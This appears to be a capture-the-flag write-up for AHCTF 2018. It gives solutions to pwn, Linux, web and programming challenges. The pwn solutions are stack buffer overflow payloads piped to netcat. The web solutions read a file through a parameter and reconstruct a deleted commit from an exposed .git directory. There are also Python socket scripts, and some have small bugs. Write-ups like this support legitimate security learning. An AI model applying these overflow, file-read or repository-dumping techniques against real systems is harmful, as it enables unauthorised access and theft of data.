CTF : AHCTF 
LINK: https://www.ahctf.com
AUTHORS: Abraham Adberstein and Abraham Fong 
DATE: Feb 1-7, 2018

----------

**PWN1-EGYPT**
Since the gets function does not check the number of bytes it assigns to buffer, we can overflow the stack.
pwn1.zip 
**Stack**
| buffer 64 bytes |  ret 4 bytes |

    $ { python -c 'print "a"*64 + "\xef\xbe\xad\xde"'; cat; } | nc 54.186.65.159 10001

**PWN2-UZBEKISTAN**
I bet you can't redirect the code flow of this program.
pwn2.zip
**Solution**
If you take a look at the code of pwn2_client, you can use objdump to find the address of the function print_flag function. Since the gets function does not check the number of bytes it assigns to buffer, we can overflow the stack. Then what we want to do is override the return address of the main function. 
**Stack**
| buffer 64 bytes | argc  4 bytes | argv 8 bytes | ret 4 bytes |

    $ objdump -d pwn2_client
    $ { python -c 'print "a"*76 + "\x9d\x84\x04\x08"'; cat; } | nc 54.186.65.159 10002

**LINUX-FOREST-SPAIN**
Have you ever heard of the question: "Where does a wise man hide a leaf?"
**Solution**
There is a folder "data" in the current directory. Inside the "data" directory, there hundres of directories where those directories contains text files with base64 encoded strings. First we get folders with the following name patter "\*.txt" and pass the those folder paths to cat, then we use args again to get each line of those files and decode them. Lastly, we grep the flag. 

     $ find -name "*.txt" | xargs -I f cat f | xargs -I % echo "%" | base64 --decode | grep AHCTF

**LINUX3-CHINA**
I'm pretty sure someone is trying to talk to us on port 10001, but I don't think we can [hear] connect to him from the outside.
**Solution**
We just needed to listen to several ports and listen for incoming data from inside the server.
**Solution**

    import socket
    for port in range(23200,23300):
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((hostname,port))
                print s.recv(1024)
            s.close()
        except:
            continue

**WEB4-RUSSIA**
I'm trusting you with my system, please don't use this file to cheat...
Access the challenge at: http://34.216.168.66:8080/dir.php
The flag will be at http://34.216.168.66:8080/flag.txt
**Solution:**
Since the hint was hinting that dir.php was doing something, we passed a common name parameter to see if it did something. 

    http://34.216.168.66:8080/dir.php?file=flag.txt

**WEB6-MOZAMBIQUE**
This is my blog, but you won't find the flag there. I removed it before the last commit.

    http://52.26.43.30/blog

Hint suggests that we need to access past commit data to find a flag. 
Git repository content is written in objects. All of them are stored in .git/objects folder.  First tested to see if it was available by appending /.git after /blog. 
This returned a page with file structure instead of a 404 error, so far so good. 
    http://52.26.43.30/blog/.git 

Git objects can be one of three types: commit, tree and blob.

 - Commit is an information about commit, with current tree (folders and
   files structure) object hash.
 - Tree contains information about folders and files structure - and
   every single folder or file has its own object hash stored in tree
   object. It might be another tree (folder which is one level down
   in the folders structure) or file.
 - Blob is Git object type where files content are saved. In other
   way - if you know an object hash of the particular file, you can
   read content of this file using git cat-file command.

After finding the .git file, we navigate to logs/HEAD file to see history of commits. 
     http://52.26.43.30/blog/.git/logs/HEAD
Here we find two interesting commits with incriminating titles. 
The commit titled *'add flag*' has a hash of `c4db23b282baa2ce1b650dd820f7de00ee82b654` 
where the first 2 chars are the file, and the rest is the name. 
if we navigate to objects/c4/db23blablablabla, we will find ourselves with a file we can download! 

Since we are dealing with git commits, we need to create a dummy Git folder.
In the terminal: 

    $ git init

This will initialize empty Git repository with all required files and folders.
We have to save the downloaded file in your dummy Git folder we created. It is imperative to be sure that you saved it in exactly the same location:

path-to-dummy-git-repository/.git/objects/c4/db23b282baa2ce1b650dd820f7de00ee82b654


These two commands will be used to dig for our key: 
To check the type of object, you can use following command:
$ git cat-file -t c4db23b282baa2ce1b650dd820f7de00ee82b654

To display the content of the object, use this command:
$ git cat-file -p c4db23b282baa2ce1b650dd820f7de00ee82b654

We use these commands to check and read the type of the object. When we look at commit descriptions , we can find information about the actual tree object hash. Remember, the tree contains information about current folder structure. So using the same method (check type and then display content),  we check the tree object we find. 

Once we dig down the tree, eventually we find only one file, index.php and we know it's object hash and type, which is blob! (Remember, a blob  Git object type where files content are saved.)


Once more, git cat file, and you will reveal the contents, which is HTML code. Near the top of the header, we find the Key. :) 





----------


**PROG3-HASHES**
**Solution**
We connect to the server, get the string and strip the value desired to hash. Then, we hash and send it to the server. We loop through this process 100 times to get the flag. 

    import socket       
    import hashlib 
    from time import sleep
    import re
      
    host = "54.186.65.159"  
    port = 20005                
    s = socket.socket()  
    
    while True:
        r =  s.recv(1048)
        print r
        if ":" in r:
                string = r.split(':')[1].replace('\n', '').strip()
                hash = hashlib.sha512()
                hash.update(string)
                result = hash.hexdigest() + "\n"
                s.send(result)
        elif r == "":
                break


**PROG4-MATHBOT**
More hashes incoming. Your hands fast enough?
**Solution**
We connect to the server, use a bit of regex to get the number to sum and send it to the server. We loop through this process 100 times to get the flag.

    import socket       
    import hashlib 
    from time import sleep
    import re
      
    host = "54.186.65.159" 
    port = 20005               
    s = socket.socket()              
    s.connect((host, port))
    
    while True: 
            #receive connection
            r =  s.recv(1048) 
            print r
            if "+" in r: 
                    result = re.match( r'.*\s*What\sis\s(.*)\s\+\s(.*)', r, re.M|re.I)
                    suma = int(result.group(1)) + int(result.group(2))
                    msg = str(suma) + "\n"
                    s.send(msg)
            elif r == "":
                    break





<!--stackedit_data:
eyJoaXN0b3J5IjpbLTMyMzgzMDE0NywtMjEwNjA1ODE3MywtMz
IzODMwMTQ3LC0yMTA2MDU4MTczLC0zMjM4MzAxNDcsLTIxMDYw
NTgxNzMsLTg2NjEzMzYzOF19
-->